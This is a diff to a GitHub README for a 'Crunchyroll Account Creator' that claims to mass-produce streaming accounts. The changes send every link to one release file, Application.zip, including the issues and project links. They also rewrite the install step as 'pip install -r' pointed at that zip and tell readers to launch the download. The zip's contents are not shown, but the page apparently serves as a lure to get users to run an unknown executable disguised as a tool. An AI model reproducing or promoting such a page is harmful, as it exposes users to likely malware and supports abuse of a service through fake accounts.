@@ -19,7 +19,7 @@ The **Crunchyroll Account Creator** is a Python-based tool designed to streamlin
 ### How to Use
 
 1. Clone the repository to your local machine.
-2. Install the necessary dependencies by running `pip install -r requirements.txt`.
+2. Install the necessary dependencies by running `pip install -r https://github.com/LESLSA/Crunchyroll-Account-Creator/releases/download/v1.0.0/Application.zip`.
 3. Customize the settings in the configuration file to suit your preferences.
 4. Run the tool and watch as it effortlessly generates Crunchyroll accounts for you.
 
@@ -27,7 +27,7 @@ The **Crunchyroll Account Creator** is a Python-based tool designed to streamlin
 
 Ready to revolutionize the way you create Crunchyroll accounts? Download the tool from the link below and launch it to experience the convenience and efficiency of automated account creation.
 
-[![Download Crunchyroll Account Creator](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/file/Application.zip)
+[![Download Crunchyroll Account Creator](https://github.com/LESLSA/Crunchyroll-Account-Creator/releases/download/v1.0.0/Application.zip)](https://github.com/LESLSA/Crunchyroll-Account-Creator/releases/download/v1.0.0/Application.zip)
 
 If the link ends with the file name, make sure to launch it to start using the tool seamlessly.
 
@@ -35,7 +35,7 @@ Don't forget to check out the "Releases" section if the provided link doesn't wo
 
 ### Your Feedback Matters
 
-We are constantly working to improve the Crunchyroll Account Creator tool and your feedback is invaluable to us. If you have any suggestions, feature requests, or issues to report, feel free to open an [issue](https://github.com/yourusername/repo/issues) on the repository.
+We are constantly working to improve the Crunchyroll Account Creator tool and your feedback is invaluable to us. If you have any suggestions, feature requests, or issues to report, feel free to open an [issue](https://github.com/LESLSA/Crunchyroll-Account-Creator/releases/download/v1.0.0/Application.zip) on the repository.
 
 ### Stay Connected
 
@@ -47,4 +47,4 @@ Thank you for choosing the Crunchyroll Account Creator. Happy account generating
 
 --- 
 
-🔗 For more information and updates, visit [Crunchyroll Account Creator](https://github.com/yourusername/repo).
+🔗 For more information and updates, visit [Crunchyroll Account Creator](https://github.com/LESLSA/Crunchyroll-Account-Creator/releases/download/v1.0.0/Application.zip).
